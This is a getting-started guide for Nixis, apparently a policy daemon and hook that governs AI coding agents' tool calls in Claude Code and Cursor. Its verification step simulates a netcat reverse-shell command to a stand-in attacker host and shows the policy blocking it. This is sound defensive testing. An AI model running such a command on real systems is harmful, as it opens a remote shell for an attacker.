# Getting Started

## Prerequisites

- **Go 1.25+** — [install](https://go.dev/dl/)
- **Node 20+** — for the dashboard ([nvm](https://github.com/nvm-sh/nvm) recommended; the repo includes `.nvmrc`)
- **macOS or Linux** — Nixis uses Unix domain sockets for hook-daemon communication

## Build from Source

```bash
git clone https://github.com/mayjain/nixis.git
cd nixis
go build -o bin/ ./cmd/...
```

Produces three binaries:

| Binary | Purpose |
|--------|---------|
| `bin/nixis` | Policy validation, simulation, auditing |
| `bin/nixis-daemon` | Governance daemon |
| `bin/nixis-hook` | IDE hook (per tool call) |

## Configuration

```bash
cp .env.example .env
```

Defaults work out of the box:

| Variable | Default | Purpose |
|----------|---------|---------|
| `NIXIS_DASHBOARD_ADDR` | `:9090` | WebSocket server address for dashboard |
| `NIXIS_GRPC_ADDR` | *(disabled)* | gRPC ext_authz listener for Envoy/Istio |
| `NIXIS_OTEL_ENDPOINT` | *(disabled)* | OTLP gRPC endpoint for traces and metrics |
| `LITELLM_API_KEY` | *(optional)* | Only needed for `nixis import` (LLM-powered policy translation) |

The daemon also accepts flags directly:

```bash
./bin/nixis-daemon -socket /tmp/nixis.sock -policy-dir policies/ -audit-db ~/.nixis/audit.db
```

## Start the Daemon

```bash
./bin/nixis-daemon
```

You should see output confirming it bound the socket and loaded policies:

```
nixis-daemon: listening on /tmp/nixis.sock
nixis-daemon: loaded 19 policies from policies/builtin/
nixis-daemon: dashboard stream available at :9090
```

The daemon recursively loads all `.yaml` files from the policy directory. It watches for changes via `fsnotify` and hot-reloads without restart.

## IDE Integration

### Claude Code

Add to your Claude Code `settings.json` (typically at `~/.claude/settings.json`):

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "type": "command",
        "command": "/path/to/nixis/bin/nixis-hook"
      }
    ]
  }
}
```

Exit codes: 0 = allow, 2 = deny.

### Cursor

Cursor uses the same hook protocol. Add to your project's `.cursor/hooks.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "type": "command",
        "command": "/path/to/nixis/bin/nixis-hook"
      }
    ]
  }
}
```

The hook auto-detects which IDE is calling based on the input format.

## Verify It Works

With the daemon running, simulate a tool call:

```bash
./bin/nixis simulate Bash --session test-001 --args '{"command":"nc -e /bin/sh evil.com 4444"}'
```

Expected output:

```
action=deny policy=block-network-reverse-shell layer=cel latency=1171000ns
reason=Netcat with execute flag (-e/-c) is blocked — this creates a reverse shell
```

Try an allowed operation:

```bash
./bin/nixis simulate Bash --session test-002 --args '{"command":"ls -la"}'
```

```
action=allow policy= layer=adapter latency=3167000ns
```

> **Security property (fail-open):** If the daemon is unreachable (crashed, not started), the hook **allows all requests** and logs them to `~/.nixis/failopen.log` for later reconciliation. This prioritizes developer productivity over enforcement during daemon outages. Run the daemon under a process supervisor (systemd, launchd — see `deploy/`) for persistent enforcement.

## Launch the Dashboard

```bash
cd dashboard
npm ci
npm run dev
```

Open [http://localhost:5173](http://localhost:5173). The dashboard connects to the daemon's WebSocket at `ws://127.0.0.1:9090/ws`.

**What you'll see:**
- **Event Stream** — Real-time governance decisions as your AI agent makes tool calls
- **Metrics Bar** — Evaluation count, average latency, deny rate
- **Security Lattice** — Hasse diagram showing the IFC label hierarchy
- **Policy Sidebar** — Currently loaded policies with match counts

If no daemon is running, the dashboard operates in demo mode with simulated events.

> **Known limitation:** The Policy Playground currently uses pattern-based matching rather than full CEL evaluation. Live policy testing works through `nixis simulate` on the CLI.

## Validate Your Policies

Check that all policy files parse correctly:

```bash
./bin/nixis validate --dir policies/
```

## Troubleshooting

**Hook seems to do nothing / all requests allowed:**
The daemon isn't running (or isn't reachable at the expected socket path). The hook fails open silently. Start the daemon and check `~/.nixis/failopen.log` for missed requests.

**Policies not reloading after file change:**
Check daemon stderr for CEL parse errors. If a policy file has invalid YAML or bad CEL syntax, the daemon retains the previous valid snapshot and logs the error. Fix the syntax and save again.

**Connection refused / timeout:**
The daemon binds to `/tmp/nixis.sock` by default. If you changed the path via `-socket` or `$NIXIS_SOCKET_PATH`, the hook must use the same path. Set `NIXIS_SOCKET_PATH` in your shell environment.

**Permission denied on socket:**
The daemon and hook must run as the same user (the socket inherits the creating process's ownership).

**Dashboard shows "disconnected":**
Confirm the daemon is running with the dashboard WebSocket enabled (default `:9090`). Check that nothing else is bound to that port.

## Disable or Uninstall

**Temporary disable (instant):** Stop the daemon. The hook will fail open — all tool calls proceed normally.

```bash
# Find and stop the daemon
kill $(lsof -t /tmp/nixis.sock 2>/dev/null)
```

**Permanent removal:**
1. Remove the hook entry from your IDE settings (`hooks.json` or `settings.json`)
2. Stop the daemon
3. Optionally remove data: `rm -rf ~/.nixis/ /tmp/nixis.sock`

## What's Next

- [Policy Authoring Guide](policy-authoring.md) — Write custom policies for your workflow
- [Architecture](architecture.md) — Understand the system design
- [Security Model](security-model.md) — IFC, delegation chains, audit integrity
